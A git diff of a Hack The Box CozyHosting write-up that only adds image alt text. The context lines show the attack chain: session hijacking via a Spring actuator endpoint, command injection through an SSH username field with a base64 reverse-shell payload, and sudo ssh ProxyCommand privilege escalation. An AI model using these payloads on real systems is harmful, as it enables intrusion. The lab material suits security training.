@@ -8,7 +8,7 @@ math: true
 mermaid: true
 ---
 
-![](/assets/images/writeups/CozyHosting-HTB/banner.png)
+![CozyHosting - HTB](/assets/images/writeups/CozyHosting-HTB/banner.png)
 
 ## TL:DR
  
@@ -49,7 +49,7 @@ We have observed that in Nmap scan, IP address gives us a reference to a domain 
 
 Let's open [http://cozyhosting.htb/](https://cozyhosting.htb).
 
-![](/assets/images/writeups/CozyHosting-HTB/1.png)
+![Browser View](/assets/images/writeups/CozyHosting-HTB/1.png)
 
 `CozyHosting` - "The right place to host a project of any complexity. Choose a plan, deploy your application and relax. Because we are going to take care of the rest". We got login page to access the dashboard." 
 
@@ -86,33 +86,33 @@ Target: http://cozyhosting.htb/
 
 We have discovered an interesting path at `/actuator/sessions`. Let's visit it and see if we can find anything valuable.
 
-![](/assets/images/writeups/CozyHosting-HTB/2.png)
+![Found actuator session](/assets/images/writeups/CozyHosting-HTB/2.png)
 
 We have found some session IDs labeled as `JSESSIONID`, and one of them contains the session ID of a user named `kanderson`. Let's utilize that `JSESSIONID` and attempt to log in as `kanderson`.
 
-![](/assets/images/writeups/CozyHosting-HTB/3.png)
+![Found JSESSION ID](/assets/images/writeups/CozyHosting-HTB/3.png)
 
 We successfully gained access to the admin dashboard as `kanderson` using the found session ID.
 
 Additionally, we discovered a service that allows us to connect to an SSH server using a `Hostname` and `Username`.
 
-![](/assets/images/writeups/CozyHosting-HTB/4.png)
+![Service for SSH](/assets/images/writeups/CozyHosting-HTB/4.png)
 
 Let's use our own hostname as `10.10.14.32` and username as `kali`.
 
-![](/assets/images/writeups/CozyHosting-HTB/5.png)
+![Setting hostname and username](/assets/images/writeups/CozyHosting-HTB/5.png)
 
 We found that the server generates an error during connection. Let's attempt a connection by providing only the `Hostname`.
 
-![](/assets/images/writeups/CozyHosting-HTB/6.png)
+![Providing hostname only](/assets/images/writeups/CozyHosting-HTB/6.png)
 
 We observed that the server returned the SSH usage information. Now, let's try providing `;` in the `username` field and observe the response.
 
-![](/assets/images/writeups/CozyHosting-HTB/7.png)
+![Username](/assets/images/writeups/CozyHosting-HTB/7.png)
 
 "We have observed in the response that it returns `command not found`. Let's try using a blank space in the `username` field and see how it responds.
 
-![](/assets/images/writeups/CozyHosting-HTB/8.png)
+![Blank space](/assets/images/writeups/CozyHosting-HTB/8.png)
 
 ## Exploitation
 
@@ -140,21 +140,21 @@ Payload - ;echo${IFS}"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzIvNDQ0NCAwPiYxCg=="|
 
 Before using this payload, let's start the netcat listener on port `4444`.
 
-![](/assets/images/writeups/CozyHosting-HTB/9.png)
+![Setting up listener](/assets/images/writeups/CozyHosting-HTB/9.png)
 
 As we observed that the payload is executed, but it is taking time to receive a response from the server. In the meantime, let's check our listener to see if we have received a shell or not.
 
-![](/assets/images/writeups/CozyHosting-HTB/10.png)
+![Got shell](/assets/images/writeups/CozyHosting-HTB/10.png)
 
 We have successfully obtained a shell as the `app` user.
 
 Additionally, we have found a `.jar` file named `cloudhosting-0.0.1.jar`.
 
-![](/assets/images/writeups/CozyHosting-HTB/11.png)
+![Found jar file](/assets/images/writeups/CozyHosting-HTB/11.png)
 
 Let's decompress this file using `unzip` and try to see if we can find anything interesting.
 
-![](/assets/images/writeups/CozyHosting-HTB/12.png)
+![Unzipping file](/assets/images/writeups/CozyHosting-HTB/12.png)
 
 We have found the credentials for `postgres`. Let's connect using the `postgres` credentials.
 
@@ -187,11 +187,11 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
-![](/assets/images/writeups/CozyHosting-HTB/13.png)
+![Found password](/assets/images/writeups/CozyHosting-HTB/13.png)
 
 Let's list the allowed commands to invoking the user using `sudo -l`.
 
-![](/assets/images/writeups/CozyHosting-HTB/14.png)
+![Listing allowed commands](/assets/images/writeups/CozyHosting-HTB/14.png)
 
 Let's check the [gtfobins](https://gtfobins.github.io) for privilege escalation.
 
@@ -199,7 +199,7 @@ Found payload - `sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
 
 If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
 
-![](/assets/images/writeups/CozyHosting-HTB/15.png)
+![Privilege escalation using gtfobins](/assets/images/writeups/CozyHosting-HTB/15.png)
 
 That's all in this writeup.
 
